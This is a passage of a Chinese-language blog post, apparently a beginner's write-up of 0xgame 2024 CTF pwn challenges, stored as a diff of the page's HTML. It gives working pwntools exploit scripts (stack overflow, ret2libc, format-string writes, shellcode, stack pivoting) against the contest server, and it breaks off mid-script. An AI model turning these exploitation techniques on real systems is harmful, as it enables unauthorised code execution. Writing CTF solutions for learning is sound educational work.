@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <script type="application/javascript" src='https://ret2ldz.github.io/js/theme-mode.js'></script>
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/frameworks.min.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/github.min.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/github-style.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/light.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/dark.css' />
+    <link rel="stylesheet" href='https://ret2ldz.github.io/css/syntax.css' />
+    <title>0xgame2024 - ldz&#39;s blog</title>
+    
+    <link rel="icon" type="image/x-icon" href='/images/github-mark.png'>
+    
+    <meta name="theme-color" content="#1e2327">
+
+    
+    
+
+    
+    <meta name="description"
+  content="菜鸟的第一场ctf比赛" />
+<meta name="keywords"
+  content='blog, google analytics' />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://ret2ldz.github.io/post/0xgame2024/" />
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="0xgame2024 - ldz&#39;s blog" />
+<meta name="twitter:description"
+  content="菜鸟的第一场ctf比赛" />
+<meta name="twitter:site" content="https://ret2ldz.github.io/" />
+<meta name="twitter:creator" content="" />
+<meta name="twitter:image"
+  content="https://ret2ldz.github.io/">
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="0xgame2024 - ldz&#39;s blog">
+<meta property="og:description"
+  content="菜鸟的第一场ctf比赛" />
+<meta property="og:url" content="https://ret2ldz.github.io/post/0xgame2024/" />
+<meta property="og:site_name" content="0xgame2024" />
+<meta property="og:image"
+  content="https://ret2ldz.github.io/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+<body>
+  <div style="position: relative">
+  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
+    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
+      <a class="Header-link" href="https://ret2ldz.github.io/">
+        <img class="octicon" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item d-md-none">
+      <button class="Header-link btn-link js-details-target" type="button"
+        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
+        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
+          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
+          </path>
+        </svg>
+      </button>
+    </div>
+    <div style="display: none;" id="header-search"
+      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
+      <div
+        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
+        <div class="position-relative">
+          
+          <form target="_blank" id="search-form" action="" accept-charset="UTF-8" method="get"
+            autocomplete="off">
+            <label
+              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
+              <input type="text"
+                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
+                name="q" value="" placeholder="Search" autocomplete="off">
+            </label>
+          </form>
+          
+        </div>
+      </div>
+    </div>
+
+    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
+      <a class="Header-link " href="https://ret2ldz.github.io/">
+        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="/images/github-mark-white.png">
+      </a>
+    </div>
+    <div class="Header-item" style="margin-right: 0;">
+      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
+        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
+          version="1.1" width="16" height="16">
+          <path fill-rule="evenodd" clip-rule="evenodd"
+            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
+          </path>
+        </svg>
+      </a>
+    </div>
+  </header>
+</div>
+
+  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
+</div>
+
+  
+<div class="application-main">
+  <div>
+  <main>
+    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
+      <div class="px-0">
+        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
+          <div class="flex-auto min-width-0 width-fit mr-3">
+            <div class="d-flex">
+              <div class="d-none d-md-block">
+                <a class="avatar mr-2 flex-shrink-0" href="https://ret2ldz.github.io/">
+                  <img class=" avatar-user"
+                    src="images/images.png"
+                    width="32" height="32"></a>
+              </div>
+              <div class="d-flex flex-column">
+                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
+                  <span class="author">
+                    <a href="https://ret2ldz.github.io/">ldz</a>
+                  </span>
+                  <span class="path-divider">/</span>
+                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
+                    <a href="https://ret2ldz.github.io/post/0xgame2024/">0xgame2024</a>
+                  </strong>
+                </h1>
+                <div class="note m-0">
+                  Created <relative-time datetime="Mon, 01 Jan 0001 00:00:00 &#43;0000"
+                    class="no-wrap">
+                    Mon, 01 Jan 0001 00:00:00 &#43;0000</relative-time>
+
+                  
+                  <span class="file-info-divider"></span>
+                  Modified <relative-time datetime="Sat, 20 Dec 2025 22:52:42 &#43;0800"
+                    class="no-wrap">
+                    Sat, 20 Dec 2025 22:52:42 &#43;0800</relative-time>
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-lg px-3 new-discussion-timeline">
+      <div class="repository-content gist-content">
+        <div>
+          <div class="js-gist-file-update-container js-task-list-container file-box">
+            <div id="file-pytest" class="file my-2">
+              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
+                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
+                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
+                    
+                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
+                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
+                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
+                      </svg>
+                    </summary>
+                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
+                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
+                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
+                        </div>
+                      </div>
+                    </details-menu>
+                      4274 Words
+                    
+
+                  </div>
+                  <div class="file-actions flex-order-2 pt-0">
+                    
+                    
+                    <a class="muted-link mr-3" href="/tags/pwn">
+                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
+                        <path fill-rule="evenodd"
+                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
+                        </path>
+                      </svg>
+                      pwn
+                    </a>
+                    
+                    <a class="muted-link mr-3" href="/tags/ctf">
+                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
+                        <path fill-rule="evenodd"
+                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
+                        </path>
+                      </svg>
+                      ctf
+                    </a>
+                    
+                    
+                  </div>
+                </div>
+              </div>
+
+
+              <div class="Box-body px-5 pb-5" style="z-index: 1">
+                <article class="markdown-body entry-content container-lg"><p><img src="../images/0.png" alt="logo"></p>
+<p>一个很不错的新生赛</p>
+<h1 id="0xgame-week1">0xgame week1</h1>
+<p>😊</p>
+<h4 id="week-1-0-test-your-nc">*<strong>[Week 1] 0. test your nc*</strong></h4>
+<p>太简单了，略</p>
+<h4 id="week-1-1-test-your-pwntools">*<strong>[Week 1] 1. test your pwntools*</strong></h4>
+<p>大概就是，接收收到的算式然后立刻返回答案，上代码</p>
+<pre tabindex="0"><code>from pwn import *
+io = remote(&#39;47.97.58.52&#39;,40010)
+context.log_level = &#39;debug&#39;   
+while(1):
+   io.recvuntil(b&#39;=\n&#39;)
+   result = io.recvuntil(b&#39; = &#39;,drop=True).decode().replace(&#39;\n&#39;,&#39;&#39;).replace(&#39;/&#39;,&#39;//&#39;)
+   result = str(eval(result)).encode()
+   io.sendline(result)
+io.interactive()
+</code></pre><h4 id="week-1-2-stack-overflow">*<strong>[Week 1] 2. stack overflow*</strong></h4>
+<p>ida反编译如下：</p>
+<!-- raw HTML omitted -->
+<p>注意语句 signal(11,getflag); 其中getflag只会给你半个flag，所以需要绕过11号报错，即sigment fault。加俩ret指令就可，所以代码如下。</p>
+<pre tabindex="0"><code>from pwn import *
+io = remote(&#39;47.97.58.52&#39;,40001)
+elf = ELF(&#39;./pwn1&#39;)
+context(os = &#39;linux&#39;,arch = &#39;amd64&#39;,log_level = &#39;debug&#39;)
+io.recvuntil(b&#39;her:\n&#39;)
+io.send(b&#39;A&#39;*32 + p64(0x40101a) + p64(0x40101a) + p64(0x4012BD))
+io.interactive()
+</code></pre><h4 id="week-1-3-positive">*<strong>[Week 1] 3. positive*</strong></h4>
+<!-- raw HTML omitted -->
+<p>显然是个整数溢出题，溢出整数buf为‘-1’因为类型转换的问题nbytes比较会失效，造成最后read函数存在栈溢出漏洞，直接给代码</p>
+<pre tabindex="0"><code>from pwn import *
+io = remote(&#39;47.97.58.52&#39;,40002)
+#io = process(&#39;./pwn2&#39;)
+context(os = &#39;linux&#39;,arch = &#39;amd64&#39;,log_level = &#39;debug&#39;)
+io.recvuntil(b&#39;walk:\n&#39;)
+io.send(b&#39;-1&#39;)
+#gdb.attach(io)
+#pause()
+io.recvuntil(b&#39;walking:&#39;)
+io.send(b&#39;A&#39;*56 +p64(0x40101a) + p64(0x40126A))
+io.interactive()
+</code></pre><h4 id="week-1-4-find_me">*<strong>[Week 1] 4. find_me*</strong></h4>
+<p>main函数如下</p>
+<!-- raw HTML omitted -->
+<p>do_bad()函数如下</p>
+<p><img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/%E5%9B%BE%E7%89%87-12-1024x687.png" alt="img"></p>
+<p>通过时间为种子生成随机数，打开v4次fake_flag，每次打开都会使新产生的文件描述符增加1，所以我们需要绕过随机数，然后在do_bad()函数中，将正确的文件描述符“找出来”，将flag写入&amp;what，再从&amp;what读出来</p>
+<p>这时候需要用到ctypes库了</p>
+<p>ctypes 是Python的外部函数库。它提供了C兼容 数据类型，并允许调用 DLL 或共享库中的函数。它可以是 用于将这些库包装在纯Python中.</p>
+<p>我们使用语句</p>
+<pre tabindex="0"><code>libc = cdll.LoadLibrary(&#39;libc.so.6&#39;)#这里的libc.so.6应该可以不是固定的，只要解决问题用哪个都行。
+</code></pre><p>这行代码使用 ctypes 库中的 cdll.LoadLibrary 函数加载了 /bin/x86_64-linux-gnu/libc.so.6 路径下的共享库，并将其赋值给了变量 libc。这样，你就可以使用 libc 变量来访问该共享库中的函数。
+*<strong>也就是说，我们能用python代码调用libc中的函数*</strong>，那么也就是说，*<strong>只要我们模仿程序里的代码，就可以生成出同样的随机数，来达到“相同的随机数”的效果，“找到”需要的flag*</strong></p>
+<p>代码如下</p>
+<pre tabindex="0"><code>from pwn import *
+from ctypes import *
+io = remote(&#39;47.97.58.52&#39;,40003)
+#io = process(&#39;./pwn4&#39;)
+elf = ELF(&#39;./pwn4&#39;)
+context(os = &#39;linux&#39;,arch = &#39;amd64&#39;,log_level = &#39;debug&#39;)
+libc = cdll.LoadLibrary(&#39;libc.so.6&#39;)
+libc.srand(libc.time(0))
+a = libc.rand()
+b = a%100
+b = b + 3
+io.sendline(b&#39;0&#39;)
+sleep(0.3)
+io.sendline(str(b).encode())
+sleep(0.3)
+io.sendline(b&#39;1&#39;)
+sleep(0.3)
+io.sendline(b&#39;2&#39;)
+io.interactive()
+</code></pre><h4 id="week-1-5-where_is_my_binsh">*<strong>[Week 1] 5. where_is_my_binsh*</strong></h4>
+<p>很简单的栈溢出</p>
+<pre tabindex="0"><code>from pwn import *
+#io = process(&#39;./pwn3&#39;)
+io = remote(&#39;47.97.58.52&#39;,40004)
+elf = ELF(&#39;./pwn3&#39;)
+sys_plt = elf.plt[&#39;system&#39;]
+binsh_addr = 0x404090
+pop_rdi_ret = 0x401323
+io.send(b&#39;/bin/sh\x00&#39;)
+io.send(b&#39;A&#39;*24 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(0x40101a) + p64(sys_plt))
+io.interactive()
+</code></pre><h4 id="week-1-6-ret2csu">*<strong>[Week 1] 6. ret2csu*</strong></h4>
+<p><img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/%E5%9B%BE%E7%89%87-13-1024x548.png" alt="img"></p>
+<p><img src="http://www.leidongzheng.com/wp-content/uploads/2024/10/%E5%9B%BE%E7%89%87-14-1024x388.png" alt="img"></p>
+<p>题目中发现了execve的got表</p>
+<p>ret2csu就是用loc_4013B6的gadget将需要的参数压入r12,r13,r14,r15</p>
+<p>公式是：rbx=0, rbp=1, r12=args1, r13=args2,</p>
+<p>r14=args4, r15=execve.got, last = loc_4013A0</p>
+<p>这样我们就可以通过loc_4013B6和loc_4013A0调用execve函数了</p>
+<pre tabindex="0"><code>from pwn import *
+#io = process(&#39;./pwn5&#39;)
+io = remote(&#39;47.97.58.52&#39;,40005)
+elf = ELF(&#39;./pwn5&#39;)
+io.send(b&#39;/bin/sh\x00&#39;)
+payload = b&#39;A&#39;*14 + b&#39;\x00&#39;*2 + b&#39;B&#39;*8 + p64(0x4013BA) + p64(0) + p64(1) + p64(0x404090) + p64(0) + p64(0) + p64(0x404038) + p64(0x4013A0) + b&#39;A&#39;*56
+#gdb.attach(io)
+#pause()
+io.send(payload)
+io.interactive()
+</code></pre><h1 id="0xgame-week2">0xgame week2</h1>
+<p>难度上来一点点，确实遇到了棘手一点的题，主要是代码总是不知道为什么就报错，这也算我的一个痛点把</p>
+<h4 id="week-2-shellcode-lv0">[Week 2] Shellcode-lv0</h4>
+<!-- raw HTML omitted -->
+<p>其实这个随机数没啥用，我们只需要在payload右边填满\x90(NOP），这样程序执行流就会被“滑下来”，多试几次就通了</p>
+<pre tabindex="0"><code>from pwn import *
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;)
+#io = process(&#39;./pwn00&#39;)
+io = remote(&#39;47.97.58.52&#39;,42012)
+payload = asm(shellcraft.amd64.sh())
+print(len(payload))
+payload = payload.rjust(0x100,b&#39;\x90&#39;)
+io.send(payload)
+#gdb.attach(io)
+#pause()
+io.interactive()
+</code></pre><h4 id="week-2-shellcode-lv1">[Week 2] Shellcode-lv1</h4>
+<!-- raw HTML omitted -->
+<p>不能使用execve，但是可以ORW一把梭</p>
+<!-- raw HTML omitted -->
+<pre tabindex="0"><code>from pwn import *
+#io = process(&#39;./shellcode_1&#39;)
+io = remote(&#39;47.97.58.52&#39;,42013)
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;)
+addr = 0x20240500
+payload = shellcraft.amd64.open(&#34;./flag&#34;)
+payload += shellcraft.amd64.read(3,addr,0x30)
+payload += shellcraft.amd64.write(1,addr,0x30)
+print(len(payload))
+payload = asm(payload)
+payload = payload.rjust(0x100,b&#39;\x90&#39;)
+io.send(payload)
+io.interactive()
+</code></pre><h4 id="week-2-ez_format">[Week 2] ez_format</h4>
+<!-- raw HTML omitted -->
+<p>因为这道题开了pie，所以没法直接读取flag的内容，需要泄露栈里地址并且加上偏移来得到&amp;flag的数值，因为很简单，所以直接上代码</p>
+<pre tabindex="0"><code>from pwn import *
+#io = process(&#39;./pwn22&#39;)
+io = remote(&#39;47.97.58.52&#39;,42001)
+context(os = &#39;linux&#39;,arch = &#39;amd64&#39;,log_level = &#39;debug&#39;)
+#gdb.attach(io)
+#pause()
+io.send(b&#39;%9$p&#39;)
+io.recvuntil(b&#39;Shanghai!\n&#39;)
+a = int(io.recv(14).decode(),16)
+print(hex(a))
+addr = a - 0x1140 + 0x40c0
+print(hex(addr))
+payload = b&#39;%7$s&#39;.ljust(8,b&#39;\x00&#39;)
+io.sendafter(b&#39;something:&#39;,payload + p64(addr))
+flag = io.recv()
+print(flag)
+io.interactive()
+</code></pre><h4 id="week-2-fmt2shellcode">[Week 2] fmt2shellcode</h4>
+<!-- raw HTML omitted -->
+<p>可以看到，我们需要满足key==26318864这个条件才能得到shell，但是有几个问题</p>
+<p>1.这题开了pie（需要提前泄露栈内的地址</p>
+<p>2.read一次读取0x20个数据（代表没法用fmtstr_payload一把梭，需要手搓</p>
+<p>3.诸如%xxxc%y$n的长度超过了8，也就是说，需要将地址放在后面两个字长的偏移而不是一个字长</p>
+<p>所以代码如下</p>
+<pre tabindex="0"><code>from pwn import *
+#io = process(&#39;./fmt20&#39;)
+io = remote(&#39;47.97.58.52&#39;,42002)
+context(os = &#39;linux&#39;,arch=&#39;amd64&#39;,log_level = &#39;debug&#39;)
+
+io.sendafter(b&#39;something:&#39;,b&#39;%9$p&#39;)
+io.recvuntil(b&#39;Shanghai!\n&#39;)
+a = int(io.recv(14).decode(),16)
+addr = a - 0x1140 + 0x4068
+print(hex(addr))
+keys = 0x1919810 
+#gdb.attach(io)
+#pause()
+payload = b&#39;%16c%8$hhn&#39;.ljust(16,b&#39;\x00&#39;) + p64(addr)
+io.sendlineafter(b&#39;something:&#39;,payload)
+
+payload = b&#39;%152c%8$hhn&#39;.ljust(16,b&#39;\x00&#39;) + p64(addr+1)
+io.sendlineafter(b&#39;something:&#39;,payload)
+
+payload = b&#39;%145c%8$hhn&#39;.ljust(16,b&#39;\x00&#39;) + p64(addr+2)
+io.sendlineafter(b&#39;something:&#39;,payload)
+
+payload = b&#39;%1c%8$hhn&#39;.ljust(16,b&#39;\x00&#39;)  + p64(addr+3)
+io.sendlineafter(b&#39;something:&#39;,payload)
+payload = b&#39;%7$s&#39;.ljust(8,b&#39;\x00&#39;)
+io.sendafter(b&#39;something:&#39;,payload + p64(addr))
+io.sendafter(b&#39;something:&#39;,b&#39;stop\x00&#39;)
+payload1 = asm(shellcraft.amd64.sh())
+io.send(payload1)
+io.interactive()
+</code></pre><h4 id="week-2-ret2libc">[Week 2] ret2libc</h4>
+<!-- raw HTML omitted -->
+<p>先泄露puts.got,然后打ret2libc</p>
+<pre tabindex="0"><code>from pwn import *
+#io = process(&#39;./pwn11&#39;)
+io = remote(&#39;47.97.58.52&#39;,42003)
+context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level = &#39;debug&#39;)
+elf = ELF(&#39;./pwn11&#39;)
+libc = ELF(&#39;libc.so.6&#39;)
+
+pop_rdi_ret = 0x4012c3
+vuln = 0x401205
+puts_got = elf.got[&#39;puts&#39;]
+puts_plt = elf.plt[&#39;puts&#39;]
+ret = 0x40101a
+
+payload = b&#39;A&#39;*40 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)
+io.send(payload)
+io.recvuntil(b&#39;?\n&#39;)
+puts_addr = u64(io.recv(6).ljust(8,b&#39;\x00&#39;))
+print(hex(puts_addr))
+libc_b = puts_addr - libc.symbols[&#39;puts&#39;]
+sys_a = libc_b + libc.symbols[&#39;system&#39;]
+bin_a = libc_b + next(libc.search(b&#34;/bin/sh\x00&#34;))
+#gdb.attach(io)
+#pause()
+payload = b&#39;A&#39;*40 + p64(ret) + p64(pop_rdi_ret) + p64(bin_a) + p64(sys_a)
+io.send(payload)
+io.interactive()                   
+</code></pre><h4 id="week-2-boom">[Week 2] boom</h4>
+<!-- raw HTML omitted -->
+<p>爆破法，strcmp会被00截断，我们可以写脚本爆破这种情况,第一次做这种题，感觉还挺好玩的</p>
+<pre tabindex="0"><code>from pwn import *
+def h():
+   io.recvuntil(b&#39;thinking?\n&#39;)
+   io.send(b&#39;\x00&#39;*0x31)
+   a = io.recv()
+   print(a)
+   if b&#39;WOW&#39; in a:
+      io.interactive()
+
+while True:
+    try:
+       io = remote(&#39;47.97.58.52&#39;,42000)
+       h()
+    except:
+       io.close()
+</code></pre><p><img src="../images/14.png" alt="logo"></p>
+<h4 id="week-2-srop">[Week 2] SROP</h4>
+<p>这题之后会放在SROP栏目里讲解</p>
+<h4 id="week-2-syscall-playground">[Week 2] Syscall playground</h4>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p>如上图，直接把/bin/sh\x00写入buffer然后执行execve(buf_addr,0,0)即可</p>
+<pre tabindex="0"><code>from pwn import *
+#io = process(&#39;./syscall&#39;)
+io = remote(&#39;47.97.58.52&#39;,42010)
+context(os = &#39;linux&#39;,arch = &#39;amd64&#39;,log_level = &#39;debug&#39;)
+
+io.sendlineafter(b&#39;choice: &#39;,b&#39;1&#39;)
+io.recvuntil(b&#39; located at &#39;)
+addr = int(io.recvuntil(b&#39;\n&#39;,drop = True).decode(),16)
+print(addr)
+io.sendlineafter(b&#39;Input your data: &#39;,b&#39;/bin/sh\x00&#39;)
+
+io.sendlineafter(b&#39;choice: &#39;,b&#39;3&#39;)
+io.sendlineafter(b&#39;call: &#39;,b&#39;59&#39;)
+io.sendlineafter(b&#39;Input the arguments count: &#39;,b&#39;3&#39;)
+io.sendlineafter(b&#39;Input the argument 0:&#39;,str(addr).encode())
+io.sendlineafter(b&#39;Input the argument 1:&#39;,b&#39;0&#39;)
+io.sendlineafter(b&#39;Input the argument 2:&#39;,b&#39;0&#39;)
+io.interactive()                
+</code></pre><p>总结：其实week2还是很简单的，但也确实有些很难见到的题型</p>
+<h1 id="0xgame-week3">0xgame week3</h1>
+<p>week3真的上难度了，看一上午有头绪的俩题进度都不快，还有一个题是关于非栈上格式化字符串的，太复杂了我甚至都不想看</p>
+<h4 id="week-3-where_is_my_stack">[Week 3] where_is_my_stack</h4>
+<p>让我想到了moe的travel of stack那题。所以临时翻了一下moe的题解，终于搞明白了,这题是关于多次栈迁移的。</p>
+<p>什么是多次栈迁移，如何多次栈迁移呢？我们需要利用read函数的汇编代码来分析：
+*<strong>多次栈迁移一般用于需要泄露libc地址或者只有一次输入的时候*</strong></p>
+<p><img src="../images/17.png" alt="logo"></p>
+<p>我们可以看到read的第二个参数rsi是由rax赋值的，rsi应该存储我们buf的地址，而这个buf地址是由***lea rax,[rbp + buf]***确定的，也就是说，*<strong>我们buf存储我们输入的地址是由rbp确定的！*</strong></p>
+<p>那么如果我们第一次传入payload0=padding + bss_fake_stack + read_addr</p>
+<p>我们的rbp会被移动到bss_fake_stack,而rsp依旧停留在栈内，接下来程序会调用read，而read存储我们输入的地址buf_addr又是由rbp决定，也就是说，我们的输入会被放在bss段内，接下来执行完read后还会执行leave_ret，而我们需要做的就是把rbp再次迁移到我们输入的代码中进行。下面放一个板子</p>
+<pre tabindex="0"><code>payload 0 = padding + bss_addr + read_addr
+paylaod n = next_rbp(addr1) + shellcode + padding + read_addr + addr1(bss_addr) + leave_ret_addr
+</code></pre><p>分析：</p>
+<p>1.payload0会把rbp送到bss_addr,而rsp依旧停留在栈内</p>
+<p>2.执行完read函数后rbp被弹到我们输入到bss_addr处的addr1，而rsp被移动到bss_addr,紧接着执行我们传入的leave-ret-addr使rbp被移动到next_rbp，rsp又再次移动到之前rbp的位置+1即&amp;shellcode，然后执行我们的shellcode进而再通过read进行下一次跳转</p>
+<p>于是我们来看题，vuln函数如下：return read(0,buf,0x30uLL);</p>
+<p><img src="../images/18.png" alt="logo"></p>
+<p>这道题的难点主要在read只读入0x30字节</p>
+<p>按照正常泄露地址的流程：</p>
+<p>payload = next_rbp + pop_rdi_ret + puts_got + puts_plt + read_addr + bss-0x20 + leave_ret一共会有0x38个字节。</p>
+<p>经过网上信息检索和出题人的提示，原来这题可以通过往上迁移八字节来写入</p>
+<p>我们可以多构造一次read函数来栈迁移，这次栈迁移的效果主要是将read计算的buf往上抬8字节，如下</p>
+<p>*<strong>(bss_fake_stcak+8)+ read_addr + ret + ret + bss-0x20 + leave_ret*</strong></p>
+<p>这样，rbp会被迁移到bss_fake_stack+8,而下次读入的&amp;buf2 = &amp;buf1 + 8，我们输入的第一个字长会在之前的read_addr处！</p>
+<p>也就是说我们可以不传入bss_fake_stack(也就是板子里的next_rbp,这样就可以少写一个字长</p>
+<p>所以我们可以给出代码！！！</p>
+<pre tabindex="0"><code>from pwn import *
+io = process(&#39;./pwn&#39;)
+#io = remote(&#39;47.97.58.52&#39;,43001)
+elf = ELF(&#39;./pwn&#39;)
+libc = ELF(&#39;libc.so.6&#39;)
+context(os = &#39;linux&#39;,arch =&#39;amd64&#39;,log_level = &#39;debug&#39;)
+puts_got = 0x404018
+puts_plt = 0x401070
+leave_ret = 0x401234
+pop_rdi = 0x4012c3
+ret = 0x40101a
+bss = 0x404800
+read = 0x40121D
+payload = b&#39;a&#39;*0x20 + p64(bss) + p64(read)
+gdb.attach(io)
+pause()
+io.sendafter(b&#39;but not stack ~\n&#39;,payload)
+payload1 = p64(bss+0x8) + p64(read) + p64(0)*2+ p64(bss-0x20) + p64(leave_ret)
+io.send(payload1)
+payload2 =p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(read) + p64(bss-0x20) + p64(leave_ret)
+io.send(payload2)
+k = u64(io.recvuntil(b&#39;\n&#39;,drop = True).ljust(8,b&#39;\x00&#39;))
+print(hex(k))
+libc_base = k - libc.symbols[&#39;puts&#39;]
+sys_addr = libc_base + libc.symbols[&#39;system&#39;]
+bin_addr = libc_base + next(libc.search(b&#34;/bin/sh\x00&#34;))
+payload3 = p64(ret)*3 + p64(pop_rdi) + p64(bin_addr)  + p64(sys_addr)
+io.send(payload3)
+io.interactive()
+</code></pre><p>经过gdb调试，发现最后rsp在0x404800(我也不清楚为什么）,所以payload3需要填充3个ret ,所以多次栈迁移真的十分依赖gdb的调试。</p>
+<h4 id="week-3-shellcode-lv2">[Week 3] Shellcode-lv2</h4>
+<p>从这题看出来我的shellcode编写能力实在差劲。。。</p>
+<p>题目逻辑如下，输入的内容中不能包含\xf\x5也就是指令syscall。</p>
+<p>首先先考虑这题如何做，看到题目开了沙箱，只能使用ORW，但是10字节肯定不够执行ORW，所以要先构造一次read读入shellcode，shellcode就存在之后的buf里继续执行</p>
+<p><img src="../images/19.png" alt="logo"></p>
+<p>但是syscall被禁了，如何绕过呢？于是有以下方法：</p>
+<p>1.构造一个0xf05(通过运算得出），并将其储存在寄存器中，最后call 这个寄存器。</p>
+<p>2.利用mov byte ptr [addr],5将5写入buf之后的内存</p>
+<p>3.使用int 0x80</p>
+<p>由于第一次读入的数据太少了只有0x10，所以考虑用方法二，所以我们需要构造一个15字节长的shellcode，然后再单独把\x0f传进去，最后mov byte ptr [addr],5会将\x05也写进去达到攻击目的。</p>
+<!-- raw HTML omitted -->
+<p>于是我们可以给出exploit：</p>
+<pre tabindex="0"><code>from pwn import *
+#io = process(&#39;./pwn1&#39;)
+io = remote(&#39;47.97.58.52&#39;,43010)
+elf = ELF(&#39;./pwn1&#39;)
+context(os = &#39;linux&#39;,arch = &#39;amd64&#39;)
+read_shell = &#34;&#34;&#34;
+xor rdi, rdi
+mov rsi,0x20240011
+nop
+mov byte ptr[rdx+16],5
+&#34;&#34;&#34;
+#gdb--rax=0,rdx=0x20240000
+print(len(asm(read_shell)))
+payload = asm(read_shell) + b&#39;\x0f&#39;
+#gdb.attach(io)
+#pause()
+io.sendafter(b&#39;Show me what you want to run: &#39;,payload)
+addr = 0x20240500
+payload1 = shellcraft.amd64.open(&#34;./flag&#34;)
